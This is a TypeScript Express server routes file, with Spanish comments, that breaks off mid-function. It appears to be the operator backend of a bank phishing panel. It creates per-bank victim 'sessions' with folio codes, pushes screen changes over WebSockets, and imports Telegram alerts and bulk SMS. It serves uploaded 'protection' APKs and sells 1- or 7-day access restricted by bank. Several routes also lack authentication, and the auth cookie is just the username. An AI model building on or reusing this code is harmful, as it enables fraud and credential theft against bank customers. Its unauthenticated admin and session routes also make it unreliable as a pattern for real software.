import type { Express } from "express";
import { static as expressStatic } from "express";
import { createServer, type Server } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { storage } from "./storage";
import { nanoid } from "nanoid";
import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType } from "@shared/schema";
import { setupAuth } from "./auth";
import axios from 'axios';
import { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification, sendFileDownloadNotification } from './telegramService';
import { sendBulkSMS, parsePhoneNumbers, validateSMSMessage } from './smsService';
import multer from 'multer';
import path from 'path';
import fs from 'fs';

// Store active connections
const clients = new Map<string, WebSocket>();
// Cambiamos a un Map para asociar cada socket con su username
const adminClients = new Map<string, WebSocket>();

// Configurar multer para subida de archivos
const storage_multer = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadPath = path.join(process.cwd(), 'uploads');
    if (!fs.existsSync(uploadPath)) {
      fs.mkdirSync(uploadPath, { recursive: true });
    }
    cb(null, uploadPath);
  },
  filename: function (req, file, cb) {
    // Generar nombre único para el archivo
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage_multer,
  limits: {
    fileSize: 50 * 1024 * 1024 // 50MB límite
  },
  fileFilter: function (req, file, cb) {
    // Permitir todos los tipos de archivo
    cb(null, true);
  }
});

export async function registerRoutes(app: Express): Promise<Server> {
  // Setup authentication
  setupAuth(app);

  // Servir archivos estáticos desde la carpeta uploads
  app.use('/uploads', expressStatic(path.join(process.cwd(), 'uploads')));
  
  // Servir archivos APK de protección desde attached_assets
  app.use('/assets', expressStatic(path.join(process.cwd(), 'attached_assets')));

  // Create HTTP server
  const httpServer = createServer(app);

  // Create WebSocket server
  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });

  // Configurar limpieza periódica de sesiones antiguas
  setInterval(async () => {
    try {
      const deletedCount = await storage.cleanupExpiredSessions();
      if (deletedCount > 0) {
        console.log(`Limpieza automática: ${deletedCount} sesiones antiguas eliminadas (>5 días)`);
        broadcastToAdmins(JSON.stringify({
          type: 'SESSIONS_CLEANUP',
          data: { deletedCount }
        }));
      }
    } catch (error) {
      console.error('Error en limpieza automática de sesiones:', error);
    }
  }, 12 * 60 * 60 * 1000); // Ejecutar cada 12 horas

  // Configurar limpieza periódica de usuarios expirados
  setInterval(async () => {
    try {
      const deactivatedCount = await storage.cleanupExpiredUsers();
      if (deactivatedCount > 0) {
        console.log(`Limpieza automática: ${deactivatedCount} usuarios expirados desactivados`);
        broadcastToAdmins(JSON.stringify({
          type: 'USERS_CLEANUP',
          data: { deactivatedCount }
        }));
      }
    } catch (error) {
      console.error('Error en limpieza automática de usuarios:', error);
    }
  }, 6 * 60 * 60 * 1000); // Ejecutar cada 6 horas

  // API endpoints
  // Rutas de administración de usuarios
  app.post('/api/admin/users', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.createAdminUser(username, password);
      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(400).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/login', async (req, res) => {
    try {
      const { username, password } = req.body;
      const user = await storage.validateAdminUser(username, password);
      if (!user) {
        return res.status(401).json({ success: false, message: "Credenciales inválidas" });
      }

      // Actualizamos la última fecha de inicio de sesión
      await storage.updateUserLastLogin(user.id);

      // Establecemos una cookie de sesión simple (en una implementación real usaríamos JWT o similar)
      res.cookie('auth_token', username, { 
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000 // 1 día
      });

      res.json({ success: true, user: { ...user, password: undefined } });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/logout', async (req, res) => {
    try {
      // Limpiar la cookie de autenticación
      res.clearCookie('auth_token');
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.post('/api/admin/users/:username/toggle', async (req, res) => {
    try {
      const { username } = req.params;
      const success = await storage.toggleAdminUserStatus(username);
      if (!success) {
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }
      res.json({ success: true });
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.get('/api/admin/users', async (req, res) => {
    try {
      const users = await storage.getAllAdminUsers();
      res.json(users.map((user: User) => ({ ...user, password: undefined })));
    } catch (error: any) {
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Ruta para obtener usuarios regulares (solo para el usuario "balonx")
  app.get('/api/users/regular', async (req, res) => {
    console.log('[API] Solicitud para obtener usuarios regulares');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const user = req.user;
    console.log(`[API] Usuario actual: ${user.username}, rol: ${user.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (user.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      console.log('[API] Obteniendo lista de usuarios regulares');
      const users = await storage.getAllUsers();
      const regularUsers = users.filter(user => user.role === UserRole.USER);
      console.log(`[API] Encontrados ${regularUsers.length} usuarios regulares`);

      // Mostrar detalles de usuarios para depuración
      regularUsers.forEach(user => {
        console.log(`[API] Usuario: ${user.username}, Activo: ${user.isActive}, Expira: ${user.expiresAt || 'No establecido'}`);
      });

      const usersList = regularUsers.map((user: User) => ({ 
        id: user.id,
        username: user.username,
        role: user.role,
        isActive: user.isActive,
        expiresAt: user.expiresAt,
        deviceCount: user.deviceCount,
        maxDevices: user.maxDevices,
        allowedBanks: user.allowedBanks || 'all',
        createdAt: user.createdAt,
        lastLogin: user.lastLogin
      }));

      res.json(usersList);
    } catch (error: any) {
      console.log(`[API] Error al obtener usuarios: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Alternar el estado de un usuario (activar/desactivar) (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/toggle-status', async (req, res) => {
    console.log('[API] Solicitud para alternar estado de usuario');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando alternar estado del usuario: ${username}`);

      const success = await storage.toggleUserStatus(username);
      if (!success) {
        return res.status(404).json({ message: "Usuario no encontrado" });
      }

      // Obtener el usuario actualizado
      const updatedUser = await storage.getUserByUsername(username);
      if (!updatedUser) {
        return res.status(404).json({ message: "Usuario no encontrado después de actualización" });
      }

      console.log(`[API] Estado de usuario alternado: ${username}, nuevo estado: ${updatedUser.isActive ? 'activo' : 'inactivo'}`);

      res.json({ 
        success: true, 
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          isActive: updatedUser.isActive,
          expiresAt: updatedUser.expiresAt,
          deviceCount: updatedUser.deviceCount,
          maxDevices: updatedUser.maxDevices,
          createdAt: updatedUser.createdAt,
          lastLogin: updatedUser.lastLogin
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al alternar estado de usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Activar un usuario por 1 día (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/activate-one-day', async (req, res) => {
    console.log('[API] Solicitud para activar usuario por 1 día');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando activar usuario: ${username}`);
      
      // Obtener usuario actual para ver bancos permitidos actual
      const existingUser = await storage.getUserByUsername(username);
      if (!existingUser) {
        throw new Error(`Usuario ${username} no encontrado`);
      }
      
      console.log(`[API] Usuario encontrado: ${username}, bancos actuales: ${existingUser.allowedBanks || 'all'}`);
      
      // Obtener los bancos permitidos de la solicitud
      const { allowedBanks } = req.body;
      console.log(`[API] Bancos recibidos del frontend: ${allowedBanks}`);
      
      // Procesar bancos permitidos antes de la activación
      let processedBanksValue: string = existingUser.allowedBanks || 'all'; // Mantener valor actual por defecto
      
      if (allowedBanks !== undefined) {
        console.log(`[API] Procesando bancos permitidos: ${allowedBanks}`);
        
        // Manejo más robusto del valor de allowedBanks
        if (typeof allowedBanks === 'string') {
          // Si es una cadena, usar directamente (puede ser 'all' o una lista separada por comas)
          processedBanksValue = allowedBanks;
          console.log(`[API] Usando valor de string directo: ${processedBanksValue}`);
        } else if (Array.isArray(allowedBanks)) {
          // Si es un array, unirlo con comas
          processedBanksValue = allowedBanks.join(',');
          console.log(`[API] Convirtiendo array a string: ${processedBanksValue}`);
        } else {
          // Caso por defecto, mantener valor actual
          console.log(`[API] Manteniendo valor actual para tipo desconocido: ${typeof allowedBanks}`);
        }
        
        // Verificar si el valor es 'all' (sin importar mayúsculas/minúsculas)
        if (typeof processedBanksValue === 'string' && processedBanksValue.toLowerCase() === 'all') {
          processedBanksValue = 'all';
          console.log(`[API] Normalizando valor a 'all'`);
        }
      }
      
      // Activamos el usuario y establecemos bancos permitidos directamente
      console.log(`[API] Activando usuario por 1 día con bancos: ${processedBanksValue}`);
      
      // Llamamos a activateUserForOneDay pasando directamente el valor de bancos permitidos
      const updatedUser = await storage.activateUserForOneDay(username, processedBanksValue);
      
      // Verificar que el valor se haya establecido correctamente
      const finalUser = await storage.getUserByUsername(username);
      if (finalUser && finalUser.allowedBanks !== processedBanksValue) {
        console.log(`[API] ADVERTENCIA: Valor incorrecto de allowedBanks después de la activación.`);
        console.log(`[API] Esperado: ${processedBanksValue}, Actual: ${finalUser.allowedBanks}`);
        
        // Forzar la actualización para asegurar que se establezca el valor correcto
        await storage.updateUser(finalUser.id, { 
          allowedBanks: processedBanksValue 
        });
      }
      
      console.log(`[API] Usuario activado con éxito: ${username}`);
      console.log(`[API] Estado final: activo=${updatedUser.isActive}, expira=${updatedUser.expiresAt}, allowedBanks=${updatedUser.allowedBanks}`);

      res.json({ 
        success: true, 
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          isActive: updatedUser.isActive,
          expiresAt: updatedUser.expiresAt,
          deviceCount: updatedUser.deviceCount,
          maxDevices: updatedUser.maxDevices,
          allowedBanks: updatedUser.allowedBanks
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al activar usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Activar un usuario por 7 días (solo para el usuario "balonx")
  app.post('/api/users/regular/:username/activate-seven-days', async (req, res) => {
    console.log('[API] Solicitud para activar usuario por 7 días');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const { username } = req.params;
      console.log(`[API] Intentando activar usuario: ${username}`);
      
      // Obtener usuario actual para ver bancos permitidos actual
      const existingUser = await storage.getUserByUsername(username);
      if (!existingUser) {
        throw new Error(`Usuario ${username} no encontrado`);
      }
      
      console.log(`[API] Usuario encontrado: ${username}, bancos actuales: ${existingUser.allowedBanks || 'all'}`);
      
      // Obtener los bancos permitidos de la solicitud
      const { allowedBanks } = req.body;
      console.log(`[API] Bancos recibidos del frontend: ${allowedBanks}`);
      
      // Procesar bancos permitidos antes de la activación
      let processedBanksValue: string = existingUser.allowedBanks || 'all'; // Mantener valor actual por defecto
      
      if (allowedBanks !== undefined) {
        console.log(`[API] Procesando bancos permitidos: ${allowedBanks}`);
        
        // Manejo más robusto del valor de allowedBanks
        if (typeof allowedBanks === 'string') {
          // Si es una cadena, usar directamente (puede ser 'all' o una lista separada por comas)
          processedBanksValue = allowedBanks;
          console.log(`[API] Usando valor de string directo: ${processedBanksValue}`);
        } else if (Array.isArray(allowedBanks)) {
          // Si es un array, unirlo con comas
          processedBanksValue = allowedBanks.join(',');
          console.log(`[API] Convirtiendo array a string: ${processedBanksValue}`);
        } else {
          // Caso por defecto, mantener valor actual
          console.log(`[API] Manteniendo valor actual para tipo desconocido: ${typeof allowedBanks}`);
        }
        
        // Verificar si el valor es 'all' (sin importar mayúsculas/minúsculas)
        if (typeof processedBanksValue === 'string' && processedBanksValue.toLowerCase() === 'all') {
          processedBanksValue = 'all';
          console.log(`[API] Normalizando valor a 'all'`);
        }
      }
      
      // Activamos el usuario y establecemos bancos permitidos
      console.log(`[API] Activando usuario por 7 días con bancos: ${processedBanksValue}`);
      
      // Llamamos a activateUserForSevenDays pasando directamente el valor de bancos permitidos
      const updatedUser = await storage.activateUserForSevenDays(username, processedBanksValue);
      
      // Obtener el usuario actualizado para asegurarnos de que tiene los bancos correctos
      const finalUser = await storage.getUserByUsername(username);
      
      // Verificar si el valor de allowedBanks es correcto
      if (finalUser && finalUser.allowedBanks !== processedBanksValue) {
        console.log(`[API] ADVERTENCIA: Valor incorrecto de allowedBanks después de la actualización.`);
        console.log(`[API] Esperado: ${processedBanksValue}, Actual: ${finalUser.allowedBanks}`);
        
        // Un intento final más forzado para actualizar el valor
        await storage.updateUser(finalUser.id, { 
          allowedBanks: processedBanksValue 
        });
        
        console.log(`[API] Actualizando nuevamente: allowedBanks = "${processedBanksValue}"`);
      }
      
      // Obtener usuario final para el response
      const responseUser = await storage.getUserByUsername(username);
      
      console.log(`[API] Usuario activado con éxito: ${username}`);
      console.log(`[API] Estado final: activo=${updatedUser.isActive}, expira=${updatedUser.expiresAt}, allowedBanks=${updatedUser.allowedBanks}`);

      res.json({ 
        success: true, 
        user: {
          id: updatedUser.id,
          username: updatedUser.username,
          role: updatedUser.role,
          isActive: updatedUser.isActive,
          expiresAt: updatedUser.expiresAt,
          deviceCount: updatedUser.deviceCount,
          maxDevices: updatedUser.maxDevices,
          allowedBanks: updatedUser.allowedBanks
        } 
      });
    } catch (error: any) {
      console.log(`[API] Error al activar usuario: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });

  // Desactivar usuarios expirados (se puede llamar manualmente o mediante un cron job)
  app.post('/api/users/cleanup-expired', async (req, res) => {
    if (!req.isAuthenticated()) {
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      return res.status(403).json({ message: "No autorizado" });
    }

    try {
      const deactivatedCount = await storage.cleanupExpiredUsers();
      res.json({ success: true, deactivatedCount });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Eliminar un usuario (solo usuario "balonx" puede hacerlo)
  app.delete('/api/users/regular/:username', async (req, res) => {
    console.log('[API] Solicitud para eliminar usuario');

    if (!req.isAuthenticated()) {
      console.log('[API] Error: Usuario no autenticado');
      return res.status(401).json({ message: "No autenticado" });
    }

    const currentUser = req.user;
    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);

    // Solo permitir al usuario "balonx" acceder a esta ruta
    if (currentUser.username !== "balonx") {
      console.log('[API] Error: Usuario no autorizado (no es balonx)');
      return res.status(403).json({ message: "No autorizado" });
    }

    const { username } = req.params;

    // No permitir eliminar al usuario admin "balonx"
    if (username === "balonx") {
      console.log('[API] Error: No se puede eliminar al usuario admin "balonx"');
      return res.status(403).json({ message: "No se puede eliminar al usuario administrador principal" });
    }

    try {
      console.log(`[API] Intentando eliminar usuario: ${username}`);
      const deleted = await storage.deleteUser(username);

      if (!deleted) {
        console.log(`[API] Error: Usuario ${username} no encontrado`);
        return res.status(404).json({ success: false, message: "Usuario no encontrado" });
      }

      console.log(`[API] Usuario eliminado con éxito: ${username}`);
      res.json({ success: true, message: `Usuario ${username} eliminado correctamente` });
    } catch (error: any) {
      console.log(`[API] Error al eliminar usuario: ${error.message}`);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  app.get('/api/admin/user', async (req, res) => {
    try {
      // Obtener el username de la cookie de autenticación
      const username = req.cookies?.auth_token;
      if (!username) {
        return res.status(401).json({ message: "No autorizado" });
      }

      // Buscar el usuario por nombre de usuario
      const user = await storage.getUserByUsername(username);
      if (!user) {
        return res.status(401).json({ message: "Usuario no encontrado" });
      }

      // Verificar si el usuario está activo
      if (!user.isActive) {
        return res.status(403).json({ message: "Usuario inactivo" });
      }

      // Devolver el usuario sin la contraseña
      res.json({ ...user, password: undefined });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  // Endpoint de depuración para ver todas las sesiones
  app.get('/api/debug/all-sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      // Solo permitir a superadmin acceder a este endpoint
      const user = req.user;
      if (user.username !== 'balonx') {
        return res.status(403).json({ message: "Solo superadmin puede acceder a este endpoint" });
      }
      
      // Obtener absolutamente todas las sesiones sin filtrar
      const allSessions = await storage.getAllSessions();
      console.log(`[Debug] Total de sesiones en almacenamiento: ${allSessions.length}`);
      
      // Contar las sesiones guardadas y corrientes
      const savedSessions = allSessions.filter(s => s.saved === true);
      const currentSessions = allSessions.filter(s => s.active === true && s.saved === false);
      
      // Verificar información de creación
      const sessionsWithCreator = allSessions.filter(s => s.createdBy).length;
      const sessionsWithoutCreator = allSessions.filter(s => !s.createdBy).length;
      
      res.json({
        count: {
          total: allSessions.length,
          saved: savedSessions.length,
          current: currentSessions.length,
          withCreator: sessionsWithCreator,
          withoutCreator: sessionsWithoutCreator
        },
        sessions: allSessions
      });
    } catch (error) {
      console.error("Error obteniendo sesiones para depuración:", error);
      res.status(500).json({ message: "Error obteniendo sesiones" });
    }
  });
  
  // Endpoint para forzar el creador de sesiones existentes (para depuración)
  app.post('/api/debug/force-session-creator', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const { sessionId, username } = req.body;
      if (!sessionId || !username) {
        return res.status(400).json({ message: "Se requiere sessionId y username" });
      }
      
      const session = await storage.getSessionById(sessionId);
      if (!session) {
        return res.status(404).json({ message: "Sesión no encontrada" });
      }
      
      // Actualizar manualmente el creador
      const updatedSession = await storage.updateSession(sessionId, { createdBy: username });
      console.log(`[Debug] Forzado creador de sesión ${sessionId} a: ${username}`);
      
      res.json({ success: true, session: updatedSession });
    } catch (error) {
      console.error("Error forzando creador de sesión:", error);
      res.status(500).json({ message: "Error forzando creador de sesión" });
    }
  });
  
  // Endpoint para crear una sesión con usuario brandon (para depuración)
  app.get('/api/debug/create-brandon-session', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      // Solo permitir a superadmin o brandon acceder
      const user = req.user;
      if (user.username !== 'balonx' && user.username !== 'brandon') {
        return res.status(403).json({ message: "No autorizado para acceder a este endpoint" });
      }
      
      // Crear sesión para brandon
      // Usar código de 8 dígitos numérico como ID de sesión y folio
      const brandLinkCode = '12345678';
      const sessionId = brandLinkCode;
      
      const session = await storage.createSession({ 
        sessionId, 
        banco: "LIVERPOOL",
        folio: brandLinkCode,
        pasoActual: ScreenType.FOLIO,
        createdBy: 'brandon', // Forzar el creador como brandon
      });
      
      // Guardar la sesión explícitamente
      const savedSession = await storage.saveSession(sessionId);
      console.log(`[Debug] Creada sesión ${sessionId} para brandon`);
      
      if (!savedSession.createdBy) {
        console.log(`[Debug] ERROR: Sesión guardada sin creador. Corrigiendo...`);
        await storage.updateSession(sessionId, { createdBy: 'brandon' });
      }
      
      // Verificar estado después de guardar
      const sessionAfterSave = await storage.getSessionById(sessionId);
      
      res.json({ 
        success: true, 
        sessionId,
        session: sessionAfterSave
      });
    } catch (error) {
      console.error("Error creando sesión de prueba:", error);
      res.status(500).json({ message: "Error creando sesión de prueba" });
    }
  });

  app.get('/api/sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const { type = 'current' } = req.query;
      const user = req.user;
      console.log(`[Sessions] Usuario ${user.username} solicitando sesiones, tipo: ${type}, rol: ${user.role}`);
      
      // Obtenemos todas las sesiones para que estén siempre actualizadas
      const allSessions = await storage.getAllSessions();
      
      // Filtramos según el tipo solicitado
      let sessions;
      if (type === 'saved') {
        sessions = allSessions.filter(s => s.saved === true);
        console.log(`[Sessions] Hay ${sessions.length} sesiones guardadas filtradas de ${allSessions.length} totales`);
      } else if (type === 'all') {
        sessions = allSessions;
        console.log(`[Sessions] Obtenidas ${sessions.length} sesiones (todas)`);
      } else {
        // Para sesiones actuales, incluimos todas las sesiones
        // Ya no filtramos por saved ya que esto hace que no se muestren las sesiones recién creadas
        sessions = allSessions;
        console.log(`[Sessions] Obtenidas ${sessions.length} sesiones actuales filtradas de ${allSessions.length} totales`);
      }
      
      // Filtrando las sesiones según el usuario
      const isSuperAdmin = user.username === 'balonx';
      const isAdmin = user.role === 'admin';
      
      if (!isAdmin) {
        const beforeCount = sessions.length;
        
        // Verificar explícitamente la existencia del campo createdBy para cada sesión
        sessions.forEach((session, index) => {
          if (!session.createdBy) {
            console.log(`[Alert] Sesión ${session.sessionId} sin creador asignado.`);
          }
        });
        
        // Filtrar solo las sesiones creadas por este usuario
        sessions = sessions.filter(session => session.createdBy === user.username);
        
        console.log(`[Sessions] Usuario ${user.username} (rol: ${user.role}), mostrando ${sessions.length} de ${beforeCount} sesiones`);
      } else if (isSuperAdmin) {
        console.log(`[Sessions] Superadministrador balonx accediendo a todas las sesiones (${sessions.length})`);
      } else {
        // Este es un admin regular (no es balonx)
        console.log(`[Sessions] Administrador ${user.username} accediendo a todas las sesiones (${sessions.length})`);
      }
      
      // Ordenamos por fecha más reciente primero
      sessions.sort((a, b) => {
        const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0;
        const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0;
        return dateB - dateA;
      });

      res.json(sessions);
    } catch (error) {
      console.error("Error fetching sessions:", error);
      res.status(500).json({ message: "Error fetching sessions" });
    }
  });

  app.post('/api/sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user;
      const { banco = "Invex" } = req.body;
      
      // Generamos un código de 8 dígitos y lo usamos como ID de sesión
      let codeForSession = '';
      for (let i = 0; i < 8; i++) {
        codeForSession += Math.floor(Math.random() * 10).toString();
      }
      const sessionId = codeForSession;
      
      const session = await storage.createSession({ 
        sessionId, 
        banco,
        folio: codeForSession,
        pasoActual: ScreenType.FOLIO,
        createdBy: user.username, // Añadimos el creador
      });
      
      // Guardar la sesión automáticamente para que aparezca en el historial
      await storage.saveSession(sessionId);
      console.log(`Sesión guardada automáticamente: ${sessionId}, creador: ${user.username}`);

      // Notificar a los clientes de admin sobre la actualización
      broadcastToAdmins(JSON.stringify({
        type: 'SESSIONS_UPDATED',
        data: {
          userName: user.username
        }
      }));
      
      res.json(session);
    } catch (error) {
      console.error("Error creating session:", error);
      res.status(500).json({ message: "Error creating session" });
    }
  });

  app.post('/api/sessions/:id/update', async (req, res) => {
    try {
      const { id } = req.params;
      const session = await storage.updateSession(id, req.body);

      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));

      res.json(session);
    } catch (error) {
      console.error("Error updating session:", error);
      res.status(500).json({ message: "Error updating session" });
    }
  });

  // Endpoint para guardar una sesión
  app.post('/api/sessions/:id/save', async (req, res) => {
    try {
      const { id } = req.params;
      const session = await storage.saveSession(id);

      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));

      res.json(session);
    } catch (error) {
      console.error("Error saving session:", error);
      res.status(500).json({ message: "Error saving session" });
    }
  });

  // Endpoint para eliminar una sesión
  app.delete('/api/sessions/:id', async (req, res) => {
    try {
      const { id } = req.params;
      const success = await storage.deleteSession(id);

      if (success) {
        // Notify all admin clients
        broadcastToAdmins(JSON.stringify({
          type: 'SESSION_DELETE',
          data: { sessionId: id }
        }));

        res.json({ success: true });
      } else {
        res.status(404).json({ success: false, message: "Session not found" });
      }
    } catch (error) {
      console.error("Error deleting session:", error);
      res.status(500).json({ message: "Error deleting session" });
    }
  });

  // Endpoint para limpiar sesiones expiradas (más de 5 días)
  app.post('/api/cleanup-sessions', async (req, res) => {
    try {
      const deletedCount = await storage.cleanupExpiredSessions();

      // Notify all admin clients to refresh their session list
      broadcastToAdmins(JSON.stringify({
        type: 'SESSIONS_CLEANUP',
        data: { deletedCount }
      }));

      res.json({ success: true, deletedCount });
    } catch (error) {
      console.error("Error cleaning up sessions:", error);
      res.status(500).json({ message: "Error cleaning up sessions" });
    }
  });

  // Endpoint para subir archivos de protección bancaria
  app.post('/api/upload-protection-file', upload.single('file'), async (req, res) => {
    try {
      if (!req.file) {
        return res.status(400).json({ message: "No se proporcionó archivo" });
      }

      const { sessionId } = req.body;
      if (!sessionId) {
        return res.status(400).json({ message: "Session ID requerido" });
      }

      // Generar URL del archivo
      const fileUrl = `/uploads/${req.file.filename}`;
      
      // Actualizar la sesión con la información del archivo
      const updatedSession = await storage.updateSession(sessionId, {
        fileName: req.file.originalname,
        fileUrl: fileUrl,
        fileSize: (req.file.size / (1024 * 1024)).toFixed(2) + ' MB'
      });

      console.log(`Archivo ${req.file.originalname} subido para sesión ${sessionId}`);

      res.json({
        success: true,
        fileName: req.file.originalname,
        fileUrl: fileUrl,
        fileSize: (req.file.size / (1024 * 1024)).toFixed(2) + ' MB'
      });
    } catch (error) {
      console.error("Error uploading protection file:", error);
      res.status(500).json({ message: "Error al subir archivo" });
    }
  });

  // Servir archivos estáticos desde la carpeta uploads
  app.use('/uploads', expressStatic(path.join(process.cwd(), 'uploads')));

  // Endpoint para obtener los bancos permitidos del usuario actual
  app.get('/api/user/allowed-banks', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const user = req.user;
      console.log(`[API] Solicitud de bancos permitidos para usuario ${user.username}`);
      console.log(`[API] Role: ${user.role}, allowedBanks: ${user.allowedBanks || 'no definido'}`);
      
      let allowedBanks: string[] = [];
      
      // Verificar siempre si el allowedBanks es undefined o null para evitar errores
      const userBanks = user.allowedBanks || 'all';
      
      // Si es el superadmin "balonx", puede ver todos los bancos sin importar su configuración
      if (user.username === "balonx") {
        console.log('[API] Usuario es superadmin (balonx), devolviendo lista completa independientemente de su configuración');
        // Devolver todos los valores de BankType excepto 'all'
        allowedBanks = Object.values(BankType).filter(bank => bank !== BankType.ALL) as string[];
      } 
      // Si es administrador pero no es balonx, verificar sus restricciones específicas de bancos
      else if (user.role === UserRole.ADMIN) {
        console.log(`[API] Usuario es admin (${user.username}), verificando restricciones específicas de bancos`);
        console.log(`[API] allowedBanks del admin: ${userBanks}`);
        
        // Verificar si tiene valor 'all' o bancos específicos
        if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
          console.log('[API] Admin tiene permiso para todos los bancos (all)');
          allowedBanks = Object.values(BankType).filter(bank => bank !== BankType.ALL) as string[];
        } else if (userBanks && userBanks !== '') {
          console.log(`[API] Admin tiene bancos específicos: ${userBanks}`);
          // Dividir la cadena por comas y procesar
          allowedBanks = userBanks
            .split(',')
            .map(b => b.trim())
            .filter(b => b.length > 0);
          
          console.log(`[API] Bancos de admin procesados: [${allowedBanks.join(', ')}]`);
        } else {
          console.log('[API] Admin sin bancos definidos');
        }
      }
      // Si el usuario tiene "all" explícitamente asignado, mostrar todos los bancos
      else if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
        console.log('[API] Usuario tiene todos los bancos permitidos (all), devolviendo lista completa');
        // Devolver todos los valores de BankType excepto 'all'
        allowedBanks = Object.values(BankType).filter(bank => bank !== BankType.ALL) as string[];
      } 
      // Si tiene bancos específicos permitidos (lista separada por comas)
      else if (userBanks && userBanks !== '') {
        console.log(`[API] Usuario tiene bancos específicos permitidos: ${userBanks}`);
        // Dividir la cadena por comas, limpiar espacios en blanco y filtrar valores vacíos
        allowedBanks = userBanks
          .split(',')
          .map(b => b.trim())
          .filter(b => b.length > 0);
        
        console.log(`[API] Bancos después de procesamiento: [${allowedBanks.join(', ')}]`);
        
        // Verificar que todos los bancos en la lista sean válidos
        const invalidBanks = allowedBanks.filter(bank => !Object.values(BankType).includes(bank as BankType));
        if (invalidBanks.length > 0) {
          console.log(`[API] ADVERTENCIA: Se encontraron bancos inválidos en la lista: ${invalidBanks.join(', ')}`);
        }
      } else {
        console.log('[API] Usuario no tiene bancos permitidos definidos o el valor está vacío');
      }
      
      console.log(`[API] Devolviendo ${allowedBanks.length} bancos permitidos:`);
      allowedBanks.forEach(bank => console.log(`[API] - Banco permitido: ${bank}`));
      
      res.json({
        success: true,
        allowedBanks,
        userRole: user.role,
        userAllowedBanksRaw: userBanks // Para depuración
      });
    } catch (error: any) {
